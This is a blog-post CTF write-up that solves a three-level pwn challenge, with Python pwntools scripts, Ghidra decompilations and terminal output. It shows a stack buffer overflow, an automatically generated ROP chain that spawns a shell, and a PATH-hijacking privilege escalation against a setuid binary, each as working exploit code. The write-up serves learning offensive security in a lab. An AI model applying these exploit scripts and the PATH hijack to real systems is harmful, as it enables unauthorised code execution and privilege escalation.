---
title: "Writeup Cyber Threat Force : bof_1 (with GetShell & PrivEsc)"
date: 2021-07-07T19:12:09+01:00
draft: false
tags: ["blog", "security", "ctf", "cyber-threat-force", "pwn"]
type: "posts"
showDate: true
---

For this challenge, we were given a service executable. It was also hosted remotely.

NOTE: since I'm writting this after the CTF ended, the demos are done locally.

## Level 1

```bash
$ checksec service                                 
[*] '/home/vivescere/ctf/bof_1/service'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

$ ./service
hello who are you?
vivescere
Hello vivescere
```

We do have NX enabled, along with canaries and partial RELRO. Also, the executable is statically linked, meaning we won't have access to the libc easily. Using Ghidra, we can look at the main function:

```c
undefined8 main(void) {
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_18;
  
  ignorMe();
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  local_18 = 0;
  puts("hello who are you?");
  __isoc99_scanf(&DAT_0049f052,&local_38);
  printf("Hello %s\n",&local_38);
  return 0;
}
```

Looks like a simple bof. We can directly find out the offset using GDB and `cycle` from pwntools:
```bash
$ cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
$ gdb ./service
...
gef➤  r
Starting program: /home/vivescere/ctf/bof_1/service 
hello who are you?
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
...
$rbp   : 0x6161616e6161616d ("maaanaaa"?)
...
[!] Cannot disassemble from $PC
────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "service", stopped 0x4019a8 in main (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4019a8 → main()
───────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  q
$ cyclic -l 0x6161616e
52
```

We have the offset, and could probably use a ropchain to pop a shell. But that's not the goal of this level. Using Ghidra again, we search for the flag format (`CYBERTF{...}`). An interesting function pops up: `magie`.

```c
void magie(int param_1) {
  int iVar1;
  undefined8 local_15;
  undefined4 local_d;
  undefined local_9;
  
  local_15 = 0x7b46545245425943;
  local_d = 0x7d595a59;
  local_9 = 0;
  if ((param_1 != -1) && (iVar1 = thunk_FUN_004010e6("CYBERTF{YZY}",&local_15), iVar1 != 0)) {
    puts("CYBERTF{_____________________}");
    return;
  }
  puts("Good Way");
  return;
}
```

`CYBERTF{_____________________}` is replaced by the real flag when connecting to the challenge remotely. A check seems to be in place, but we can simply jump past it.

After whipping out a quick script (using [pwninit](https://github.com/io12/pwninit)), we get the flag:
```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("./service")

context.binary = exe
context.terminal = ['konsole', '-e']

def conn():
    if args.LOCAL:
        r = process([exe.path])
    else:
        r = remote("XXX.XXX.XXX.XXX", 00000)

    return r

def main():
    r = conn()

    # Jump into magie, right where the function prints the flag
    offset = 56
    r.sendline(flat({offset: p64(0x4018da)}))

    print(r.recvall().decode(errors='ignore'))
    r.close()

if __name__ == "__main__":
    main()
```

```bash
$ python solve_basic.py LOCAL
[*] '/home/vivescere/ctf/bof_1/service'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/vivescere/ctf/bof_1/service': pid 650148
[+] Receiving all data: Done (116B)
[*] Process '/home/vivescere/ctf/bof_1/service' stopped with exit code -7 (SIGBUS) (pid 650148)
hello who are you?
Hello aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa\x18
CYBERTF{_____________________}
```

The flag was `CYBERTF{B@sic_Buff3r_Ov3rflow}`.

## Level 2: GetShell

Our goal is now to pop a shell. We still have the NX bit on, so we could try using a ropchain. Since the CTF was short, I first tried to automatically generate one using `ropper`:

```bash
$ ropper --file service --chain "execve cmd=/bin/sh"
...
```

The command worked, so I just plugged it into my previous script:

```python
#!/usr/bin/env python3
from pwn import *
from struct import pack

exe = ELF("./service")

context.binary = exe
context.terminal = ['konsole', '-e']

def gen_rop():
    p = lambda x : pack('Q', x)

    IMAGE_BASE_0 = 0x0000000000400000 # aae3c9732e164e7d4d0643ec3d3d8bd1f2a571dcb933e57afd11939c43984473
    rebase_0 = lambda x : p(x + IMAGE_BASE_0)

    rop = b''

    rop += rebase_0(0x000000000000962f) # 0x000000000040962f: pop r13; ret; 
    rop += b'//bin/sh'
    rop += rebase_0(0x0000000000001b2d) # 0x0000000000401b2d: pop rbx; ret; 
    rop += rebase_0(0x00000000000cc0e0)
    rop += rebase_0(0x00000000000715c2) # 0x00000000004715c2: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += rebase_0(0x000000000000962f) # 0x000000000040962f: pop r13; ret; 
    rop += p(0x0000000000000000)
    rop += rebase_0(0x0000000000001b2d) # 0x0000000000401b2d: pop rbx; ret; 
    rop += rebase_0(0x00000000000cc0e8)
    rop += rebase_0(0x00000000000715c2) # 0x00000000004715c2: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret; 
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += p(0xdeadbeefdeadbeef)
    rop += rebase_0(0x0000000000001ece) # 0x0000000000401ece: pop rdi; ret; 
    rop += rebase_0(0x00000000000cc0e0)
    rop += rebase_0(0x000000000000880e) # 0x000000000040880e: pop rsi; ret; 
    rop += rebase_0(0x00000000000cc0e8)
    rop += rebase_0(0x000000000008ef5b) # 0x000000000048ef5b: pop rdx; pop rbx; ret; 
    rop += rebase_0(0x00000000000cc0e8)
    rop += p(0xdeadbeefdeadbeef)
    rop += rebase_0(0x000000000000302c) # 0x000000000040302c: pop rax; ret; 
    rop += p(0x000000000000003b)
    rop += rebase_0(0x000000000001ca64) # 0x000000000041ca64: syscall; ret; 
    return rop

def conn():
    if args.LOCAL:
        r = process([exe.path])
    else:
        r = remote("XXX.XXX.XXX.XXX", 00000)

    return r

def main():
    r = conn()

    wanted = p64(0x401885)
    offset = 56

    r.recvuntil('?')
    r.recvline()
    r.sendline(flat({offset: gen_rop()}))
    r.recvline()

    r.interactive()

if __name__ == "__main__":
    main()
```

```bash
$ python solve.py LOCAL
[*] '/home/vivescere/ctf/bof_1/service'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/home/vivescere/ctf/bof_1/service': pid 682309
[*] Switching to interactive mode
$ pwd
/home/vivescere/ctf/bof_1
```

And it worked! The flag was in `/home/ctf/flag.txt`: `CYBERTF{B@sic_R0PChain}`.

## Level 3: PrivEsc

I started looking around the filesystem, and quickly found a SETUID binary: `/bin/check`. I didn't have a way to download it using SCP, so I patched the exploit to do it instead:

```python
def main():
    r = conn()

    wanted = p64(0x401885)
    offset = 56

    r.recvuntil('?')
    r.recvline()
    r.sendline(flat({offset: gen_rop()}))
    r.recvline()

    with open('check', 'wb') as f:
        r.sendline('cat /bin/check')
        r.sendline('exit')
        f.write(r.recvall())
```

I then decompiled the main function using Ghidra:

```c
undefined8 main(void) {
  int iVar1;
  undefined8 uVar2;
  size_t sVar3;
  long lVar4;
  undefined8 *puVar5;
  long in_FS_OFFSET;
  byte bVar6;
  undefined8 local_420;
  undefined8 local_418;
  undefined8 local_410;
  undefined8 local_408 [127];
  long local_10;
  
  bVar6 = 0;
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setreuid(0x3e9,0x3e9);
  local_418 = 0;
  local_410 = 0;
  lVar4 = 0x7e;
  puVar5 = local_408;
  while (lVar4 != 0) {
    lVar4 = lVar4 + -1;
    *puVar5 = 0;
    puVar5 = puVar5 + (ulong)bVar6 * -2 + 1;
  }
  local_420 = popen("md5sum /home/ctf_cracked/flag.txt | cut -d \' \' -f 1","r");
  if (local_420 == (FILE *)0x0) {
    puts("Command Failed");
    uVar2 = 1;
  }
  else {
    fgets((char *)&local_418,0x400,local_420);
    sVar3 = strlen((char *)&local_418);
    *(undefined *)((long)&local_420 + sVar3 + 7) = 0;
    iVar1 = strcmp((char *)&local_418,"8b098e9d5692641375f8da6d399edf98");
    if (iVar1 == 0) {
      puts("All is clear");
    }
    else {
      puts("Contact Administrator");
    }
    uVar2 = 0;
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar2;
}
```

The file containing the flag is (of course) not directly readable, but the owner is the same as the binary owner: `ctf_cracked`. The program executes a command. We can abuse this by editing the PATH before launching the binary:

```bash
$ cd /tmp
$ mkdir solution
$ echo '#!/bin/bash' >> md5sum
$ echo 'cat /home/ctf_cracked/flag.txt > /tmp/solution/flag.txt' >> md5sum
$ PATH=$(pwd):/bin check
$ cat /tmp/solution/flag.txt
```

The flag was `CYBERTF{B@sicPrivEsc(Anti_Gu3ssing)}`.

## More

You can [view the sources on github](https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/pwn/bof1) or [read other writeups](/blog/cyber-threat-force-ctf/).
